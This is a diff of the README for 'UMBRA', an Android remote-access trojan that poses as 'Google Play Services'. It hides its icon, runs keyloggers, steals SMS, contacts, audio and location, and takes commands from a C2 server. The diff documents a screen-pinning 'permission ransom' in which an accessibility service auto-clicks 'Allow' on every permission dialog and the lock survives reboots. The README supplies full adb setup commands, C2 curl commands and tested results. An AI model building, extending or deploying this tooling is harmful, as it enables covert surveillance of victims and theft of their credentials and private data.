@@ -38,7 +38,7 @@
 - **Stealth agent** — installs as `org.umbra.core` with the display label *"Google Play Services"*. No launcher icon ever appears.
 - **18+ modules** — SMS, calls, contacts, files, shell, GPS, microphone (M4A), camera, silent-grant, Knox exploitation, device admin, permission ransom, live monitoring, root, keylogger, and more.
 - **Two keylogger modes** — an accessibility-service keylogger *and* a banking-app-safe IME (custom keyboard) keylogger.
-- **Permission ransom** — transparent overlay that blocks device usage until the user grants all 13 dangerous permissions. Auto-restarts every 3 seconds. No user-click needed beyond the initial "Allow" taps.
+- **Permission ransom** — full-screen lock that blocks device usage until the user grants all 14 dangerous permissions. Uses `startLockTask()` to pin the screen, a 1-second watchdog, an accessibility-service auto-click that taps "Allow" on every dialog, and a 2-second re-request loop. Survives reboots. Zero user interaction required once the accessibility service is enabled.
 - **Device admin** — registered as an active device admin via `dpm set-active-admin`, enabling background activity starts and DPM policy control.
 - **Encrypted transport** — `wss://` with AES-256-GCM per-message encryption.
 - **Self-signed TLS** — the server auto-generates a P-256 certificate on first run.
@@ -130,6 +130,7 @@ UMBRA/
 | 11 | `silent_grant` | `grant` | 14 permission-bypass techniques | ❌ Android 16 blocks all 14 |
 | 12 | `knox` | `grant` `enumerate` `shell_exploit` | Samsung Knox binder exploitation (206 IApplicationPolicy methods mapped) | ✅ binder accessible |
 | 13 | `dpm_grant` | `grant` | DevicePolicyManager permission grant (requires device owner) | ⚠️ needs device owner |
+| 13b | `dpm_remove` | `remove` | Deactivate own device admin via `removeActiveAdmin()` (enables uninstall) | ⚠️ only works for test-only admin |
 | 14 | `live` | `start` `stop` `status` | Real-time push monitoring (SMS, call state, clipboard) | ✅ |
 | 15 | `root` | `check` `exploit` `daemonize` `exploit_download` | 8-vector privilege-escalation chain | ⚠️ checks only, no root yet |
 | 16 | `keylog` | `start` `stop` `dump` `status` `start_keyboard` `enable_keyboard` | Keystroke capture (accessibility + IME) | ✅ both modes |
@@ -202,10 +203,10 @@ The server auto-generates a self-signed TLS certificate on first run and listens
 ### 4. Install the agent
 
 ```bash
-adb install -t app/build/outputs/apk/debug/app-debug.apk
+adb install app/build/outputs/apk/debug/app-debug.apk
 ```
 
-> The `-t` flag is required because the APK is marked `testOnly` (allows `dpm remove-active-admin` to work for clean uninstall).
+> No `-t` flag — the APK is a normal (non-testOnly) install. This keeps the trojan concept intact (installs like any sideloaded app).
 
 ### 5. Register as device admin (enables permission ransom + background activity start)
 
@@ -213,26 +214,33 @@ adb install -t app/build/outputs/apk/debug/app-debug.apk
 adb shell dpm set-active-admin org.umbra.core/.persistence.UmbraAdminReceiver
 ```
 
-### 6. Grant runtime permissions
+### 6. Enable the accessibility service (enables auto-click on permission dialogs + keylogger)
+
+```bash
+adb shell settings put secure enabled_accessibility_services org.umbra.core/org.umbra.core.modules.UmbraAccessibilityService
+adb shell settings put secure accessibility_enabled 1
+```
+
+### 7. Grant runtime permissions
 
 ```bash
 for p in CAMERA ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION RECORD_AUDIO \
-         READ_MEDIA_IMAGES READ_MEDIA_VIDEO READ_MEDIA_AUDIO READ_SMS \
-         RECEIVE_SMS READ_CONTACTS READ_CALL_LOG READ_PHONE_STATE \
+         READ_MEDIA_IMAGES READ_MEDIA_VIDEO READ_MEDIA_AUDIO READ_MEDIA_VISUAL_USER_SELECTED \
+         READ_SMS RECEIVE_SMS READ_CONTACTS READ_CALL_LOG READ_PHONE_STATE \
          POST_NOTIFICATIONS; do
     adb shell pm grant org.umbra.core android.permission.$p
 done
 ```
 
-> Alternatively, skip this step and let the **Permission Ransom** handle it automatically — see below.
+> Alternatively, skip this step and let the **Permission Ransom** auto-grant everything via the accessibility-service auto-click — see below.
 
-### 7. Launch the agent
+### 8. Launch the agent
 
 ```bash
 adb shell am start -n org.umbra.core/.MainActivity
 ```
 
-### 8. Open the dashboard
+### 9. Open the dashboard
 
 ```text
 https://YOUR_SERVER_IP:8443
@@ -242,12 +250,20 @@ https://YOUR_SERVER_IP:8443
 
 ### Uninstall
 
+The APK is not `testOnly`, so `dpm remove-active-admin` will refuse to remove the admin. Use this sequence:
+
 ```bash
-adb shell dpm remove-active-admin org.umbra.core/.persistence.UmbraAdminReceiver
+# 1. Disable the package (clears enough DPM state for uninstall)
+adb shell pm disable-user org.umbra.core
+
+# 2. Re-enable it
+adb shell pm enable org.umbra.core
+
+# 3. Uninstall
 adb uninstall org.umbra.core
 ```
 
-> If `remove-active-admin` fails with `non-test admin`, the admin was registered by an older APK version. Deactivate it manually: **Settings → Security and privacy → Other security settings → Device admin apps** → find *"Google Play Services"* → deactivate. Then run `adb uninstall org.umbra.core`.
+> Alternative: trigger the `dpm_remove` module via C2 (calls `removeActiveAdmin()` from the app's own context — works only if the admin was registered as test-only), then uninstall. Or deactivate manually: **Settings → Security and privacy → Other security settings → Device admin apps** → find *"Google Play Services"* → deactivate → uninstall.
 
 ---
 
@@ -296,45 +312,63 @@ Android 16 (Samsung One UI 8.5) enforces the permission model at multiple layers
 ### Three options for granting permissions:
 
 1. **ADB `pm grant`** (manual, reliable) — run the grant loop in step 6 above.
-2. **Permission Ransom** (semi-automated) — see below.
+2. **Permission Ransom** (fully automated) — see below.
 3. **Root exploit** — once root is achieved, copy APK to `/system/priv-app/` and grant all permissions programmatically.
 
 ---
 
 ## Permission Ransom Mode
 
-When you cannot use ADB `pm grant` (e.g., the device is remote), the **Permission Ransom** forces the user to grant all 13 dangerous permissions with minimal interaction.
+When you cannot use ADB `pm grant` (e.g., the device is remote), the **Permission Ransom** locks the device and auto-grants all 14 dangerous permissions with **zero user interaction** — the accessibility service taps "Allow" on every dialog automatically.
 
 ### How it works
 
-1. `UmbraService` (foreground service) runs a watchdog every **3 seconds** checking `checkSelfPermission()` for all 13 dangerous permissions.
-2. If any are missing, it launches `PermissionRansomActivity` — a transparent overlay (`Theme.Translucent.NoTitleBar`) with `excludeFromRecents` and `noHistory`.
-3. After 3 seconds, the activity auto-calls `requestPermissions()` for all missing permissions at once.
-4. The system permission dialog (`GrantPermissionsActivity`) appears over whatever the user was doing.
-5. If denied, the activity re-launches itself via `AlarmManager` in **1 second**.
-6. The watchdog also calls `killBackgroundProcesses()` on non-system apps to make the popup harder to dismiss.
-7. When all 13 permissions are granted, the watchdog stops and the activity never appears again.
-8. The app icon never appears — the launcher alias stays disabled.
+1. `UmbraService` (foreground service) runs a watchdog every **1 second** checking `checkSelfPermission()` for all 14 dangerous permissions.
+2. If any are missing, it launches `PermissionRansomActivity` — a **full-screen opaque** activity (`Theme.Material.NoActionBar`) that calls `startLockTask()` to **pin the screen** (home/recents/back are blocked).
+3. The activity auto-calls `requestPermissions()` for all missing permissions after 1 second.
+4. The system permission dialog (`GrantPermissionsActivity`) appears over the locked screen.
+5. The `UmbraAccessibilityService` detects the dialog (via `TYPE_WINDOW_STATE_CHANGED`) and **auto-clicks "Allow"** on every dialog, granting permissions one by one without any user taps.
+6. If a permission is denied, `onRequestPermissionsResult` re-requests it after **2 seconds** — the dialog keeps coming back until everything is granted.
+7. If the user escapes the lock task (long-press Back+Recents), the 1-second watchdog + `AlarmManager` re-launch the activity immediately.
+8. If the phone is rebooted, `BootReceiver` + `KeepAliveWorker` + `WatchdogAlarm` + `WatchdogJob` (all persisted) re-launch the ransom after boot.
+9. When all 14 permissions are granted, everything stops — the lock task releases, the watchdog idles, and the app goes completely stealth.
+
+### Defense layers (5)
+
+| Layer | Mechanism | What it blocks |
+|-------|-----------|----------------|
+| 1 | `startLockTask()` | Home, Recents, Back buttons — screen is pinned |
+| 2 | FGS watchdog (1s) | Activity dismissed — re-launches instantly |
+| 3 | `AlarmManager` (1s) | FGS killed — re-launches via PendingIntent |
+| 4 | Accessibility auto-click | User tapping "Don't allow" — the "Allow" button is clicked automatically |
+| 5 | Boot persistence | Phone reboot — BootReceiver + KeepAliveWorker + WatchdogJob re-launch |
 
 ### Why it works
 
 - The app is registered as a **device admin** (`dpm set-active-admin`), which exempts it from background activity start restrictions.
+- `startLockTask()` pins the screen — the user physically cannot leave the ransom until permissions are granted.
 - The foreground service (`UmbraService`) keeps the watchdog alive through Doze.
-- Only the system permission dialog is visible — the app itself is invisible.
+- The accessibility service runs the auto-click in a separate system-managed process, so it survives even if the main app process is killed.
+- Only the system permission dialog is visible — the app itself is invisible (no launcher icon).
 
 ### Test result (SM-A356B, Android 16)
 
-- Started with 0/13 permissions granted.
-- Within 30 seconds: 9/13 granted by user clicking through system dialogs.
-- Remaining 4 (READ_SMS, media) granted via ADB to finish the test.
-- After all granted: watchdog stopped, app invisible, SMS/contacts/files/camera all working.
+- Fresh install → ransom shows with 14/14 permissions missing, screen pinned (`mLockTaskModeState=PINNED`).
+- Accessibility auto-click grants all permissions automatically: 14 → 7 → 6 → 5 → 2 → **all granted**.
+- Launcher blocked with `Attempted Lock Task Mode violation` when user presses Home.
+- Full reboot test passed: app auto-started after boot, ransom re-appeared, auto-granted everything, then went stealth.
+- Final state: `granted=false` count = 0, ransom stopped, agent connected to C2 (`online_count=1`), lock task released, app icon hidden.
 
 ### Files
 
-- `PermissionRansomActivity.kt` — transparent activity, auto-request, re-launch logic
-- `UmbraService.kt` — watchdog runnable (3s interval), `killBackgroundProcesses`
+- `PermissionRansomActivity.kt` — full-screen lock activity, `startLockTask()`, `requestInFlight` guard, `isShowing` flag, re-request loop
+- `PermissionOverlayService.kt` — `SYSTEM_ALERT_WINDOW` overlay (second layer, draws over everything)
+- `UmbraAccessibilityService.kt` — auto-clicks "Allow" on dialogs, auto-toggles overlay, re-launches on app switch
+- `UmbraService.kt` — 1s watchdog, `killBackgroundProcesses`, starts overlay
 - `UmbraAdminReceiver.kt` + `res/xml/device_admin.xml` — device admin registration
-- `DpmPermissionGrant.kt` — DPM-based grant module (works when device owner is available)
+- `DpmPermissionGrant.kt` — DPM-based grant + `dpm_remove` action (removes own admin)
+- `BootReceiver.kt` — launches ransom 5s after boot
+- `KeepAliveWorker.kt` / `WatchdogAlarm.kt` / `WatchdogJob.kt` — all check permissions and re-launch ransom
 
 ---
 
@@ -536,12 +570,16 @@ curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
   -d '{"device_id":"'$ID'","module":"knox","action":"shell_exploit"}'
 ```
 
-### 13. dpm_grant
+### 13. dpm_grant / dpm_remove
 
 ```bash
 # Attempt DPM-based permission grant (requires device owner)
 curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
   -d '{"device_id":"'$ID'","module":"dpm_grant","action":"grant"}'
+
+# Deactivate own device admin (enables uninstall — only works for test-only admin)
+curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
+  -d '{"device_id":"'$ID'","module":"dpm_remove","action":"remove"}'
 ```
 
 ### 14. live
@@ -656,6 +694,9 @@ Open `https://YOUR_SERVER_IP:8443` in a browser.
 | Camera / screen capture fails | Knox HAL / SELinux block it from an untrusted app; see Known Limitations |
 | Mic recording shows 0s duration | Fixed — now uses `SystemClock.elapsedRealtime()` for accurate duration |
 | Mic audio is garbage / won't play | Fixed — switched from AAC_ADTS to MPEG-4 (M4A) container |
+| Permission ransom doesn't auto-click | Accessibility service unbound after reinstall — re-run `settings put secure enabled_accessibility_services ...` + `accessibility_enabled 1` |
+| Permissions stuck `USER_FIXED` (won't show dialog) | User tapped "Don't allow" twice — run `adb shell pm reset-permissions org.umbra.core` to clear, or `pm clear` |
+| Can't uninstall (`DELETE_FAILED_DEVICE_POLICY_MANAGER`) | Run `pm disable-user org.umbra.core` → `pm enable org.umbra.core` → `adb uninstall org.umbra.core` |
 
 ---
 
@@ -668,6 +709,7 @@ Open `https://YOUR_SERVER_IP:8443` in a browser.
 - **Location** — GPS fix times out if the GPS radio is off; network-location fallback is partial.
 - **Root** — the 8-vector chain currently *detects* privilege-escalation opportunities but has not achieved root on the tested device.
 - **Self-signed TLS** — the generated certificate is untrusted by browsers; use `curl -k` or import it manually.
+- **Accessibility re-enable** — the accessibility service unbinds after every `adb install -r` / `pm clear`; re-run the `settings put secure enabled_accessibility_services` command to rebind it (Samsung quirk).
 
 ---
 
